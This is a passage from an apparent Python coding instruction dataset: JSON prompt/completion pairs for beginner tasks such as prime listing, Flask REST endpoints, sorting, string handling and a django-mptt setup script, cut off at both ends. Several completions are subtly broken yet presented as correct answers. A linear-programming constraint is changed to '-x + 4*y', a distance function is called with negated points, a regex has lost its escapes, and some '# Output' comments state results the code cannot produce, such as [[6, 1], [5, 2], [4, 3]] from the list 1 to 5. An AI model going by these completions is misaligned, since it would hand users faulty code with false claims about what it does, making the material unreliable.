sklearn.cluster import KMeans data = [[6.400e+01, -3.800e+01, 2.320e+02, 1.500e+00, 9.400e+00], ... ... ... ... ... [2.390e+01, -1.050e+00, 6.400e+01, 4.200e+00, 2.500e+00]] # Create a DataFrame from data df = pd.DataFrame(data, columns=['Feature 1', 'Feature 2', 'Feature 3', 'Feature 4', 'Feature 5']) # Create a KMeans instance kmeans = KMeans(n_clusters=3, random_state=0) # Fit the model to data kmeans.fit(df) # Print the cluster labels print(kmeans.labels_)"},{"prompt":"Write a Python program to remove all duplicated words from a given input string. sentence = This is a sentence with some duplicate words in it.","completion":"sentence_words = sentence.split(\\" \\") unique_words = set(sentence_words) print(\\" \\".join(unique_words))"},{"prompt":"Write a Python script to detect if two strings contain the same characters. Output should be true or false. s1 = abc s2 = bca","completion":"def is_permutation(s1, s2): s1_list = list(s1) s2_list = list(s2) s1_list.sort() s2_list.sort() if s1_list == s2_list: return True else: return False print(is_permutation(\\"abc\\", \\"bca\\")) # True"},{"prompt":"Write a Python program to print out all prime numbers under 100.","completion":"def print_prime_numbers(n): for num in range(2, n): prime = True for div in range(2, int(num**0.5)+1): if num % div == 0: prime = False break if prime: print(num) print_prime_numbers(100)"},{"prompt":"Build an algorithm in Python to solve a linear programming problem. Maximize: 5x + 3y Subject to: x + 4y ≤ 8 2x + y ≤ 6 X,Y ≥ 0","completion":"from pulp import * # Create the linear programming problem lp_prob = LpProblem(\\"Linear Programming Problem\\", LpMaximize) # Create problem variables x = LpVariable('x', lowBound=0) y = LpVariable('y', lowBound=0) # Objective function lp_prob += 5*x + 3*y # Constraints lp_prob += -x + 4*y <= 8 lp_prob += 2*x + y <= 6 # Solve the problem status = lp_prob.solve() print(\\"Optimal solution:\\") print('Optimal value: {:.2f}'.format(pulp.value(lp_prob.objective))) print('x = {}'.format(x.varValue)) print('y = {}'.format(y.varValue))"},{"prompt":"Write a Python program that simulates a daily news broadcast. Not applicable","completion":"import random #List of news headlines headlines = [ \\"A new COVID-19 vaccine will be released in the next 6 months\\", \\"New laws to reduce pollution enacted in 15 countries\\", \\"A volcanic eruption in Indonesia causes massive destruction\\" ] #Number of news headlines to simulate numHeadlines = 3 #Generate a random set of headlines randomHeadlines = random.sample(headlines, numHeadlines) #Iterate through list of headlines and simulate a news broadcast for headline in randomHeadlines: print(\\"This is a breaking news update: \\" + headline)"},{"prompt":"Create a Python program to calculate the average age of students based on their grades. students = [ {'name': 'John', 'grade': 10, 'age': 10}, {'name': 'Jane', 'grade': 8, 'age': 14}, {'name': 'Kate', 'grade': 9, 'age': 12} ]","completion":"students = [ {'name': 'John', 'grade': 10, 'age': 10}, {'name': 'Jane', 'grade': 8, 'age': 14}, {'name': 'Kate', 'grade': 9, 'age': 12} ] grades = [10, 8, 9] age_sum = 0 for grade in grades: age_sum += [student['age'] for student in students if student['grade'] == grade ][0] print('Average age: {}'.format(age_sum/len(grades)))"},{"prompt":"Write a Python program that takes a number n and generates a dictionary that contains (i, i*i) such that n is greater than or equal to i >= 1 and n = 8","completion":"def generate_dict(n): d = {} for i in range(1, n+1): d[i] = i*i return d"},{"prompt":"Write a Python program to optimize the following objective function: z = x + y – 2xy, where x,y ∈ [0,1].","completion":"def optimize_func(x,y): return (x + y - (2 * x * y)) def optimize(upper_bound): best_val = 0 for x in range(0, upper_bound + 1): for y in range(0, upper_bound + 1): cur_val = optimize_func(x,y) if cur_val > best_val: best_val = cur_val return best_val"},{"prompt":"Write a Python program to find the minimum number of swaps needed to sort the given array in ascending order.","completion":"def min_swaps(nums): n = len(nums) count = 0 for i in range(n): while nums[i] != i + 1: swap(nums, i, nums[i] - 1) count += 1 return count def swap(nums, i, j): nums[i], nums[j] = nums[j], nums[i]"},{"prompt":"Create a Python script to read a dictionary, and then print only the keys whose values are greater than 5. Not applicable","completion":"my_dict = { 'a': 1, 'b': 2, 'c': 8, 'd': 4 } for key, value in my_dict.items(): if value > 5: print(key) # Output: c"},{"prompt":"Python, write a script for generating one million random passwords.","completion":"import random for x in range(1000000): password = '' for i in range(12): password += random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#!') print(password)"},{"prompt":"Generate a Python program that searches a large list of strings to find those matching a given pattern. list = [123 abc, 456 def, 789 ghi, 123 jkl, 456 mno, 789 pqr] pattern = 456*","completion":"search_list = [\\"123 abc\\", \\"456 def\\", \\"789 ghi\\", \\"123 jkl\\", \\"456 mno\\", \\"789 pqr\\"] pattern = \\"456*\\" matches = [] for item in search_list: if item.startswith(pattern): matches.append(item) print(matches)"},{"prompt":"Generate a Python program to partition a given array into two parts such that every element in first part is less or equal than the elements in the second part. [1, 9, 0, 5, 2]","completion":"def partition(arr): pivot = arr[0] i = 0 j = len(arr) - 1 while i <= j: while arr[i] < pivot: i += 1 while arr[j] > pivot: j -= 1 if i <= j: arr[i], arr[j] = arr[j], arr[i] i +=1 j -= 1 return arr print(partition([1, 9, 0, 5, 2]))"},{"prompt":"Create a Python code to split a given string into an array with all of the individual sentences. 'This is a test string with three sentences!'","completion":"def split_sentences(text): sentences = [] start = 0 for i in range(len(text)): if text[i] == '.' or text[i] == '!' or text[i] == '?': sentences.append(text[start:i+1]) start = i+1 return sentences split_sentences('This is a test string with three sentences!')"},{"prompt":"Design a function in Python that takes in a 2D matrix and prints all elements in spiral order. [[1, 2, 3], [4, 5, 6], [7, 8, 9]]","completion":"def spiralPrint(arr): n = len(arr) rowBegin = 0 rowEnd = n-1 colBegin = 0 colEnd = n-1 while (rowBegin <= rowEnd and colBegin <= colEnd): for i in range(colBegin, colEnd + 1): print(arr[rowBegin][i], end =\\" \\") rowBegin += 1 for i in range(rowBegin, rowEnd + 1): print(arr[i][colEnd], end =\\" \\") colEnd -= 1 if ( rowBegin <= rowEnd): for i in range(colEnd, colBegin - 1, -1): print(arr[rowEnd][i], end =\\" \\") rowEnd -= 1 if (colBegin <= colEnd): for i in range(rowEnd, rowBegin - 1, -1): print(arr[i][colBegin], end =\\" \\") colBegin += 1 #Driver Code arr = [[1, 2, 3], [4, 5, 6], [7, 8, 9]] spiralPrint(arr) # Output: 1 2 3 6 9 8 7 4 5"},{"prompt":"Create a Python program to calculate the average of all the ratings in the given list of tuple. [(3, 4), (5, 5), (7, 3)]","completion":"def avg_rating(ratings): total = 0 for rating in ratings: total += rating[0] + rating[1] return total / (len(ratings)*2)"},{"prompt":"Create a REST API in Python Flask for a simple blog application with endpoints for creating a post, getting a post, and updating a post. Not applicable","completion":"from flask import Flask, request, jsonify app = Flask(__name__) posts = [] @app.route('/posts',methods=['POST']) def create_post(): data = request.get_json() post = { 'title': data['title'], 'content': data['content'] } posts.append(post) return jsonify(post) @app.route('/posts/<string:title>', methods=['GET']) def get_post(title): for post in posts: if post['title'] == title: return jsonify(post) return jsonify({'message': 'Post not found!'}) @app.route('/posts/<string:title>', methods=['PUT']) def update_post(title): data = request.get_json() for post in posts: if post['title'] == title: post['title'] = data['title'] post['content'] = data['content'] return jsonify(post) return jsonify({'message': 'Post not found!'}) if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Create a python function that takes a list of numbers and returns their median.","completion":"def get_median(lst): sorted_list = sorted(lst) len_list = len(lst) if len_list % 2 == 0: return (sorted_list[len_list//2 - 1] + sorted_list[len_list//2])/2 else: return sorted_list[len_list//2]"},{"prompt":"Create a python program to detect whether a string contains any duplicate characters.","completion":"def foundDuplicates(string): '''This function will detect if a string contains any duplicate characters.''' seen = set() for char in string: if char in seen: return True seen.add(char) return False"},{"prompt":"Generate a function in Python that takes a web page URL and returns the page's HTML source code. url = https://www.example.com","completion":"import requests def get_html_source(url): \\"\\"\\" This function takes a web page URL and returns the page's HTML source code. :param url: url :return: html source \\"\\"\\" response = requests.get(url) return response.text"},{"prompt":"Write a function in Python to convert a list of strings to an array of integers. list = ['12','14','17','25','99','168']","completion":"def convert_list_integers(str_list): return list(map(int, str_list)) list = ['12','14','17','25','99','168'] arr = convert_list_integers(list) print(arr) # [12, 14, 17, 25, 99, 168]"},{"prompt":"Write a Python program to split a list into two halves. [14, 8, 3, 7, 5]","completion":"def split_list(lst): half = len(lst) // 2 return lst[:half], lst[half:] left, right = split_list([14, 8, 3, 7, 5]) print (\\"Left list : \\", left) print (\\"Right list : \\", right)"},{"prompt":"Rearrange the words in the following sentence to create a meaningful sentence. sentence = program a to write Python","completion":"Write a program in Python."},{"prompt":"Create an algorithm using Python to find the largest number in a list. [8, 5, 10, 3]","completion":"def find_largest_number(numbers): # Finds the largest number from the given list largest = 0 for num in numbers: if num > largest: largest = num return largest numbers = [8, 5, 10, 3] largest = find_largest_number(numbers) print(largest)"},{"prompt":"Generate a function in Python that takes a list and returns a list of all possible subsequences. [1, 2, 3]","completion":"def get_subsequences(arr): subsequences = [[]] for num in arr: new_subsequences = [] for sub in subsequences: new_subsequences.append(sub + [num]) subsequences += new_subsequences return subsequences arr = [1, 2, 3] result = get_subsequences(arr) print(result)"},{"prompt":"Create a python program to find all possible combination of arrangements of a list of words. ['dog', 'cat', 'fish']","completion":"import itertools words = ['dog', 'cat', 'fish'] result = list(itertools.permutations(words)) for word in result: print(word)"},{"prompt":"Write a Python program to calculate the sum of the digits of an integer.","completion":"def digitSum(n): if n == 0: return 0 else: return (n % 10) + digitSum(int(n / 10))"},{"prompt":"Design a function in Python to classify all the numbers in a list as even or odd. my_list = [1,2,3,4,5]","completion":"def classify_odd_even(nums): output = [] for n in nums: if n%2 == 0: output.append('even') else: output.append('odd') return output if __name__ == '__main__': print(classify_odd_even(my_list))"},{"prompt":"Can you make a Python program to print out the Fibonacci sequence up to the nth element of the sequence? 8","completion":"def Fibonacci(n): a = 0 b = 1 if n < 0: print(\\"Incorrect input\\") elif n == 0: return 0 elif n == 1: return 1 else: for i in range(2,n): c = a + b a = b b = c return b print(Fibonacci(8)) # Output: 13"},{"prompt":"Create a Python script to reverse a string using recursion. Not applicable","completion":"def reverse_string(s): if len(s) == 0: return s else: return reverse_string(s[1:]) + s[0] # Test string = \\"test string\\" print(reverse_string(string)) # Output: \\"gnirts tset\\""},{"prompt":"Build a Python program to print out the 3 largest odd numbers in a given list. [4, 7, 1, 2, 8, 5]","completion":"list_of_nums = [4, 7, -1, 2, 8, 5] largest_odd_numbers = [] for num in list_of_nums: if num % 2 != 0 and len(largest_odd_numbers) < 3: largest_odd_numbers.append(num) largest_odd_numbers.sort() print (largest_odd_numbers)"},{"prompt":"Write a python code to find all numbers in a given string, and print them out. There are 45.8 apples and 12.3 oranges.","completion":"import re string = \\"There are 45.8 apples and 12.3 oranges.\\" numbers = re.findall(r\\"[-+]?d*.d+|d+\\", string) print(numbers) # Output: ['45.8', '12.3']"},{"prompt":"Code a function in Python that generates a list of prime numbers up to a given limit.","completion":"def generate_prime_numbers(limit): # Create an initial list of all numbers from 0 up to the limit. primes = [True] * (limit + 1) # Set 0 and 1 to False since that are not primes. primes[0] = False primes[1] = False # Iterate through the numbers up to the square root of the limit for i in range(2, int(limit**0.5) + 1): if primes[i] == True: # set the multiples of this number to False for j in range(i*i, limit+1, i): primes[j] = False # Create a list with only True elements (those which are prime numbers) true_primes = [i for i in range(2, limit+1) if primes[i] == True] return true_primes"},{"prompt":"Write a Python script to combine two dictionaries into one. dict1 = {'a':1, 'b':2} dict2 = {'c':3, 'd':4}","completion":"def merge_dicts(dict1, dict2): merged_dict = {**dict1, **dict2} return merged_dict"},{"prompt":"Create a Python script that takes in an array of numbers and returns the mode. [1, 2, 5, 2, 3, 2, 5, 2]","completion":"def mode(list): count_dict = {} for item in list: if item in count_dict: count_dict[item] += 1 else: count_dict[item] = 1 max_count = 0 mode = 0 for key in count_dict.keys(): if count_dict[key] > max_count: max_count = count_dict[key] mode = key return mode numbers = [1, 2, 5, 2, 3, 2, 5, 2] print(mode(numbers))"},{"prompt":"Build a REST API endpoint in Python that takes a user's name and returns a personalized greeting message. name = John","completion":"from flask import Flask app = Flask(__name__) @app.route('/greeting', methods=['GET']) def get_greeting(name): return 'Hello, ' + name + '!' if __name__ == '__main__': app.run()"},{"prompt":"Develop a function in Python which takes an input array of strings and returns a dictionary with the strings stored in their reverse order. [Hello, World]","completion":"def reverseStrings(arr): revDict = {}; for str in arr: revDict[str[::-1]] = str; return revDict; reverseStrings([\\"Hello\\", \\"World\\"]); // Outputs: {'olleH': 'Hello', 'dlroW': 'World'}"},{"prompt":"Write a Python function to count the number of digits in a given number.","completion":"def count_digits(num): return len(str(abs(num)))"},{"prompt":"Optimize a function for generating a random string in Python. The function should generate a string with 7 characters that include both numbers and letters def random_string(): string = '' for i in range(7): string += chr(randint(97, 122)) string += str(randint(0, 9)) return string","completion":"import random def random_string(): string = ''.join(random.sample( 'abcdefghijklmnopqrstuvwxyz' + '0123456789', 7)) return string"},{"prompt":"Create a code in python for performing principal component analysis on the given dataset. import pandas as pd data = {'Name':['Alice','Bob','Charlie','Dave','Emily'], 'Score1':[62,89,85,72,74], 'Score2':[64,87,84,78,76]} df = pd.DataFrame(data)","completion":"import pandas as pd from sklearn.decomposition import PCA data = {'Name':['Alice','Bob','Charlie','Dave','Emily'], 'Score1':[62,89,85,72,74], 'Score2':[64,87,84,78,76]} df = pd.DataFrame(data) # Define X and y X = df[['Score1', 'Score2']] y = df['Name'] # Perform PCA pca = PCA(n_components=2) X_reduced = pca.fit_transform(X) # Print the explained variance for each component print(pca.explained_variance_ratio_)"},{"prompt":"Create an API request using Python to get the status of your favorite website. Website URL: example.com","completion":"import requests url = 'http://example.com' r = requests.get(url) if r.status_code == 200: print('Website is up and running.') else: print('Website is not responding.')"},{"prompt":"To use the Djangomptt package, follow these steps: 1. Import os, INSTALL_SCHEMES, and setup from distutils.command.install. 2. Define a function called fullsplit that splits a pathname into components in a platformneutral way. 3. Modify the INSTALL_SCHEMES to put the data_files in platformspecific installation locations. 4. Compile the list of packages available and the data files. 5. Call the setup function with the appropriate parameters, including the name, description, version, author, author_email, url, packages, data_files, and classifiers.","completion":"\\"\\"\\" Based entirely on Django's own \`\`setup.py\`\`. \\"\\"\\" import os from distutils.command.install import INSTALL_SCHEMES from distutils.core import setup def fullsplit(path, result=None): \\"\\"\\" Split a pathname into components (the opposite of os.path.join) in a platform-neutral way. \\"\\"\\" if result is None: result = [] head, tail = os.path.split(path) if head == '': return [tail] + result if head == path: return result return fullsplit(head, [tail] + result) # Tell distutils to put the data_files in platform-specific installation # locations. See here for an explanation: # http://groups.google.com/group/comp.lang.python/browse_thread/thread/35ec7b2fed36eaec/2105ee4d9e8042cb for scheme in INSTALL_SCHEMES.values(): scheme['data'] = scheme['purelib'] # Compile the list of packages available, because distutils doesn't have # an easy way to do this. packages, data_files = [], [] root_dir = os.path.dirname(__file__) mptt_dir = os.path.join(root_dir, 'mptt') pieces = fullsplit(root_dir) if pieces[-1] == '': len_root_dir = len(pieces) - 1 else: len_root_dir = len(pieces) for dirpath, dirnames, filenames in os.walk(mptt_dir): # Ignore dirnames that start with '.' for i, dirname in enumerate(dirnames): if dirname.startswith('.'): del dirnames[i] if '__init__.py' in filenames: packages.append('.'.join(fullsplit(dirpath)[len_root_dir:])) elif filenames: data_files.append([dirpath, [os.path.join(dirpath, f) for f in filenames]]) setup( name = 'django-mptt', description = 'Utilities for implementing Modified Preorder Tree Traversal with your Django Models and working with trees of Model instances', version = '0.3_pre', author = 'Jonathan Buchanan', author_email = 'jonathan.buchanan@gmail.com', url = 'http://code.google.com/p/django-mptt/', packages = packages, data_files = data_files, classifiers = ['Development Status :: 4 - Beta', 'Environment :: Web Environment', 'Framework :: Django', 'Intended Audience :: Developers', 'License :: OSI Approved :: BSD License', 'Operating System :: OS Independent', 'Programming Language :: Python', 'Topic :: Utilities'], )"},{"prompt":"Create a Python script to identify the frequency of words in a sentence. Sentence = This is a test sentence","completion":"from collections import Counter sentence = \\"This is a test sentence\\" #split the sentence into words words = sentence.split() #count the frequency of each word word_frequency = Counter(words) #print the results print(word_frequency)"},{"prompt":"Compose a program to take in a string as an input and output only the unique characters in it. pytho","completion":"def unique_chars(string): unique_characters = set() for char in string: unique_characters.add(char) return unique_characters print(unique_chars(\\"python\\"))"},{"prompt":"Design a Python function to print out all permutations of a given string. ABC","completion":"def permute(s): if len(s) == 1: return s perms = [] for i in range(len(s)): element = s[i] remaining_elements = s[:i] + s[i+1:] z = permute(remaining_elements) for t in z: perms.append(element + t) return perms print(permute(\\"ABC\\"))"},{"prompt":"Create a program using Python to make a request to an API and predict the probability of a type of tree occurring in a given area. Sample geojson features in the area, specific tree type","completion":"import requests import json import pandas as pd def predict_tree(geojson, tree_type): # Make a request to the API url = \\"http://api.example.com\\" response = requests.post(url, data=geojson) # Parse the json of the response data = json.loads(response.text) # Check for errors if data[\\"error\\"]: print(data[\\"error\\"]) return # Create a pandas DataFrame from the response df = pd.DataFrame(data[\\"tree_data\\"]) # Calculate the probability of the tree_type risk = df[tree_type].sum() / df[\\"total_trees\\"].sum() return risk"},{"prompt":"Write a Python function to classify a given animal as a mammal, bird, reptile, or fish. lio","completion":"def classify_animal(animal): if animal == \\"lion\\": return \\"mammal\\" elif animal == \\"eagle\\": return \\"bird\\" elif animal == \\"crocodile\\": return \\"reptile\\" elif animal == \\"salmon\\": return \\"fish\\" else: return \\"unknown\\""},{"prompt":"Design a loop in Python to iterate over the elements of a list and print the elements in reverse order. [10, 15, 20]","completion":"my_list = [10, 15, 20] for i in my_list[::-1]: print(i)"},{"prompt":"Construct a python code structure to compute the distance between two points in a 3D coordinate system. Point 1: (3, 4, 9) Point 2: (5, 6, 7)","completion":"import math # Define a function to calculate the distance between two points def distance(x1, y1, z1, x2, y2, z2): # Compute the length of each side a = x2 - x1 b = y2 - y1 c = z2 - z1 # Compute the distance d = math.sqrt(a**2 + b**2 + c**2) return d # Call the function with the two points d = distance(3, 4, 9, -5, -6, -7) # Print the distance print(d)"},{"prompt":"Compress the following string using the gzip library in Python. String: This is a sample string to compress.","completion":"import gzip string = \\"This is a sample string to compress.\\" compressed_string = gzip.compress(string.encode('utf-8')) print(compressed_string)"},{"prompt":"Create a program in Python to find the second highest number in a list of numbers. [8, 5, 11, 6, 9, 15]","completion":"# Create an array of numbers nums = [8, 5, 11, 6, 9, 15] # Sort the array in descending order nums.sort(reverse=True) # Get the second highest number second_highest = nums[1] # Output the result print(\\"The second highest number is\\", second_highest)"},{"prompt":"Convert the given Python program from procedural to objectoriented. def multiply(a, b): c = a * b print(Result is: , c)","completion":"class Multiplier: def __init__(self): pass def multiply(self, a, b): c = a * b print(\\"Result is: \\", c) mult = Multiplier() mult.multiply(a, b)"},{"prompt":"Using the turtle library in Python, create a geometric shape.","completion":"import turtle t = turtle.Turtle(); t.speed(2); t.right(72); t.fd(100); t.left(144); t.fd(100); t.left(144); t.fd(100); t.left(144); t.fd(100); t.left(144); t.fd(100); t.done();"},{"prompt":"mplement a solution using Python to analyze text and determine the sentiment of a given text. Text: This movie was absolutely amazing!","completion":"#Import libraries import nltk from nltk.sentiment.vader import SentimentIntensityAnalyzer #Define text text = \\"This movie was absolutely amazing!\\" #Create SentimentIntensityAnalyzer sia = SentimentIntensityAnalyzer() #Analyze sentiment sentiment_scores = sia.polarity_scores(text) #Print sentiment scores print(\\"{:-<40} {}\\".format(text, str(sentiment_scores))) #Print sentiment label if sentiment_scores['compound'] > 0: print(\\"Positive\\") elif sentiment_scores['compound'] == 0: print(\\"Neutral\\") else: print(\\"Negative\\")"},{"prompt":"Design a neural network in python to recognize handwritten digits","completion":"import tensorflow as tf mnist = tf.keras.datasets.mnist (x_train, y_train),(x_test, y_test) = mnist.load_data() x_train, x_test = x_train / 255.0, x_test / 255.0 model = tf.keras.models.Sequential([ tf.keras.layers.Flatten(input_shape=(28, 28)), tf.keras.layers.Dense(128, activation='relu'), tf.keras.layers.Dropout(0.2), tf.keras.layers.Dense(10, activation='softmax') ]) model.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['accuracy']) model.fit(x_train, y_train, epochs=5)"},{"prompt":"Create a program in Python to print the greatest of three numbers. 2, 4, 3","completion":"def get_max(x, y, z): if (x > y) and (x > z): maximum = x elif (y > x) and (y > z): maximum = y else: maximum = z return maximum result = get_max(2, 4, 3) print(result)"},{"prompt":"Write a python program to take in two strings, s1 and s2, and return the longest common substring. s1 = abcd1234 s2 = aa112345","completion":"def longest_common_substring(s1, s2): \\"\\"\\" Function to return the longest common substring of two input strings Parameters: s1 (string): String #1 s2 (string): String #2 Returns: longest_sub (string): The longest common substring \\"\\"\\" m = [[0] * (1 + len(s2)) for i in range(1 + len(s1))] longest, x_longest = 0, 0 for x in range(1, 1 + len(s1)): for y in range(1, 1 + len(s2)): if s1[x - 1] == s2[y - 1]: m[x][y] = m[x - 1][y - 1] + 1 if m[x][y] > longest: longest = m[x][y] x_longest = x else: m[x][y] = 0 longest_sub = s1[x_longest - longest: x_longest] return longest_sub longest_common_substring(s1, s2) # Result: '123'"},{"prompt":"Generate a python function to find the largest number from the given list [10, 20, 40, 19]","completion":"def largest_number(list): largest = list[0] for number in list: if number > largest: largest = number return largest"},{"prompt":"Construct a Python dictionary to store information about a user. name: John Smith age: 32 location: US","completion":"user_info = { 'name': 'John Smith', 'age': 32, 'location': 'USA' }"},{"prompt":"Write a Python program to sort a given list of dictionaries based on a given key. list = [{'name': 'Alice', 'age': 24}, {'name': 'Bob', 'age': 27}, {'name': 'David', 'age': 29}]","completion":"def sort_dictionaries(list, key): return sorted(list, key=lambda i: i[key])"},{"prompt":"Create a REST API using Python and Flask to allow users to store and access data. Not applicable","completion":"import flask from flask import jsonify import sqlite3 from flask import g app = flask.Flask(name) DATABASE = 'data.db' def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(DATABASE) return db @app.route('/data', methods=['POST']) def store_data(): db = get_db() cur = db.cursor() cur.execute(\\"INSERT INTO data (data) VALUES (?)\\", (flask.request.form['data'],)) db.commit() return jsonify(status='OK', message='Data stored') @app.route('/data', methods=['GET']) def get_data(): db = get_db() cur = db.cursor() cur.execute('SELECT * FROM data') row = cur.fetchall() data = [item[0] for item in row] return jsonify(status='OK', message=data) if name == 'main': app.run(debug=True)"},{"prompt":"Construct a function in Python to check if the provided year is a leap year.","completion":"def is_leap_year(year): if year % 4 == 0 and (year % 100 != 0 or year % 400 == 0): return True else: return False"},{"prompt":"Can you develop a program using Python to check if number is prime? 13","completion":"def is_prime(n): if (n <= 1): return False elif (n <= 3): return True elif (n % 2 == 0 or n % 3 == 0): return False i = 5 while(i * i <= n): if (n % i == 0 or n % (i + 2) == 0): return False i = i + 6 return True print(is_prime(13))"},{"prompt":"Create a class in Python that takes a string of characters as its argument and stores it.","completion":"class StringClass: def __init__(self, string): self.string = string def printString(self): print(self.string)"},{"prompt":"Create a Python algorithm that takes in an array of integers and prints out a sum of its elements. [3, 4, 5, 6]","completion":"def sum_array(arr): s = 0 for i in arr: s += i return s"},{"prompt":"Write a function using Python that takes two strings and checks whether one is an anagram of the other.","completion":"def is_anagram(str1, str2): \\"\\"\\"This function checks whether two strings are an anagram of each other. Args: str1 (str): The first string. str2 (str): The second string. Returns: bool: True if the two strings are an anagram, False otherwise. \\"\\"\\" if len(str1) == len(str2): return all(str1.lower().count(c) == str2.lower().count(c) for c in str1.lower()) else: return False"},{"prompt":"Create a background job in Python to run every 5 minutes.","completion":"# Importing the necessary module import schedule # Defining the job def job(): print(\\"Job executed!\\") # Scheduling the job to run every 5 minutes schedule.every(5).minutes.do(job) # Running the job while True: schedule.run_pending()"},{"prompt":"Generate a Python program to find the missing element in a given integer array of 1 to 100. [1, 2, 4, 6, 7, 10]","completion":"def find_missing_element(nums): # Sum of the numbers from 1 to 100 sum_of_nums = (100*(101))//2 # Compute the sum of the given numbers sum_of_given_nums = 0 for num in nums: sum_of_given_nums += num # Compute the missing element missing_element = sum_of_nums - sum_of_given_nums return missing_element nums = [1, 2, 4, 6, 7, 10] missing_element = find_missing_element(nums) print(\\"The missing element is:\\", missing_element)"},{"prompt":"Generate a class in Python for a Simple Moving Average (SMA) calculator with a constructor that takes the window size and a method named calculate to calculate the SMA from a given list of values. list = [10, 20, 30, 40, 50]","completion":"class SMA: def __init__(self, window_size): self.window_size = window_size self.window = [] def calculate(self, values): window = [] sma = 0 for value in values: if len(self.window) < self.window_size: self.window.append(value) else: self.window.pop(0) self.window.append(value) sma += value return sma / self.window_size list = [10, 20, 30, 40, 50] sma = SMA(3) print(sma.calculate(list)) # Output: 30"},{"prompt":"Create a function in Python that takes a number n and returns the sum of its digits. 378","completion":"def sum_of_digits(n): sum = 0 while n: sum += n % 10 n //= 10 return sum print(sum_of_digits(378))"},{"prompt":"Develop a python program to predict whether a given customer is going to pay next month's bill. A dataset containing customer information such as credit score, payment history etc.","completion":"# Load the data df = pd.read_csv('data.csv') # Create the necessary features X = df.drop('Payment', axis=1) y = df['Payment'] # Train the model model = LogisticRegression() model.fit(X, y) # Make predictions predictions = model.predict(X) # Check accuracy of predictions accuracy = accuracy_score(y,predictions) print(accuracy)"},{"prompt":"Create a script in Python that checks a provided URL for a specific keyword within its content and outputs either a pass or fail result. URL: http://www.example.com Keyword: succe","completion":"import requests url = 'http://www.example.com' keyword = 'success' r = requests.get(url) if keyword in r.text: print('Pass') else: print('Fail')"},{"prompt":"Build a recommendation system in Python for finding similar items.","completion":"# import libraries import numpy as np import scipy from nltk.stem.porter import * import pandas as pd from scipy.spatial.distance import cosine, correlation from sklearn import metrics # Read the metadata metadata = pd.read_csv('movies_metadata.csv') # select the required columns metadata = metadata[['title', 'genres']] # calculate the genre of the movie by using any tokenizer like # RegexpTokenizer or PorterStemmer tokenizer stemmer = PorterStemmer() # Function to get genre def get_genre(x): genre1 = [] try: mylist = x['genres'].split('|') for i in mylist: # print(stemmer.stem(i)) genre1.append(stemmer.stem(i)) except: pass return genre1 # create a new column having all the genres metadata['genre_new'] = metadata.apply(get_genre, axis = 1) # Function to calculate the similarity between moviess # based on their genres def genre_similarity(x): sim = [] for i in x['genre_new']: indx = metadata[metadata['genre_new'].map(lambda d: i in d)].index sim.extend(list(metadata['title'][indx])) return sim[:20] # create a new column having the similar movies to each movie metadata['sim_movies'] = metadata.apply(genre_similarity, axis = 1)"},{"prompt":"Write a Python script that takes a list of integers and returns a list of all unique combinations (of length 2) of integers that sum up to a given total. listOfIntegers = [1, 2, 3, 4, 5] sumTotal = 7","completion":"def findCombinations(listOfIntegers, sumTotal): combinations = [] for i in range(len(listOfIntegers)): for j in range(i+1, len(listOfIntegers)): if listOfIntegers[i] + listOfIntegers[j] == sumTotal: combinations.append([listOfIntegers[i], listOfIntegers[j]]) return combinations listOfIntegers = [1, 2, 3, 4, 5] sumTotal = 7 print(findCombinations(listOfIntegers, sumTotal)) # Output: [[6, 1], [5, 2], [4, 3]]"},{"prompt":"Build an AI chatbot using Python and Dialogflow. Not applicable","completion":"import os import json #import the packages from flask import Flask, request #initialization app = Flask(__name__) @app.route('/webhook', methods=['GET', 'POST']) def webhook(): #handle user message req = request.get_json(silent=True, force=True) user_input = req[\\"queryResult\\"][\\"queryText\\"] result = { \\"fulfillmentText\\":\\"This is a sample response from your webhook!\\" } #send response res = json.dumps(result, indent=4) print(res) r = make_response(res) r.headers['Content-Type'] = 'application/json' return r @app.route('/', methods=['GET']) def index(): return 'hello world' if __name__ == '__main__': port = int(os.getenv('PORT', 5000)) print(\\"Starting app on port %d\\" % port) app.run(debug=False, port=port, host='0.0.0.0')"},{"prompt":"Write a Python program to find the index of an item in a list. my_list = [1,2,3,4] item = 3","completion":"def find_index(lst,item): for i in range(len(lst)): if item == lst[i]: return i index = find_index(my_list, item) print(index) # 2"},{"prompt":"Generate a Python program to remove a keyvalue pair in a dictionary. d = { 'a': 10, 'b': 20, 'c':30 }","completion":"def remove_pair(d, key): if key in d: del d[key] return d d = { 'a': 10, 'b': 20, 'c':30 } remove_pair(d, 'c')"},{"prompt":"Compute the prime factors of a given number using Python. 24","completion":"def primeFactors(num): for div in range(2, num // 2 + 1): while num % div == 0: print(div) num //= div if num > 1: print(num) num = 24 primeFactors(num) // 2, 2, 2, 3"},{"prompt":"Create a Python program that accepts two numbers as an input and prints out the ratio of the two numbers. number1 = 13 number2 = 24","completion":"def calculateRatio(number1, number2): return number1/number2 number1 = 13 number2 = 24 ratioOfNumbers = calculateRatio(number1, number2) print(\\"The ratio of the two numbers is: \\" + str(ratioOfNumbers))"},{"prompt":"Create a program in Python to identify whether a character is uppercase, lowercase or a digit. char = 'A'","completion":"def char_type(char): # check if character is uppercase if char.isupper(): print('Uppercase') # check if character is lowercase elif char.islower(): print('Lowercase') # check if character is digit elif char.isdigit(): print('Digit') else: print('Special Character') char_type('A')"},{"prompt":"Create a Python program that takes a list and an integer, and returns whether the list contains a sublist with the given sum. List: [2, 3, 4] Integer: 8","completion":"def has_sublist_with_sum(list, n): for i in range(len(list) - 1): sum = 0 for j in range(i + 1, len(list)): sum += list[j] if sum == n: return True return False list = [2, 3, 4] n = 8 print(has_sublist_with_sum(list, n)) # prints True"},{"prompt":"Generate a random number between two given numbers, using Python. min_range = 30 max_range = 100","completion":"\\"\\"\\" Generate a random number between two given numbers, using Python \\"\\"\\" import random def random_number(min_range, max_range): return random.randrange(min_range, max_range) print(random_number(30, 100))"},{"prompt":"Write a Python program to clean a given text from unwanted words and punctuations. A raw string","completion":"import string def clean_text(text): # remove punctuation translator = str.maketrans('', '', string.punctuation) text = text.translate(translator) # remove unwanted words unwanted_words = {'the', 'and', 'a'} words = text.split(' ') words = [word for word in words if word not in unwanted_words] return ' '.join(words)"},{"prompt":"Create a Python script that takes in a positive integer as argument and prints out the Fibonacci sequence up to that number. 5","completion":"def fibonacci(n): a, b = 0, 1 fibonacci = [a] while b < n: fibonacci.append(b) a, b = b, a + b return 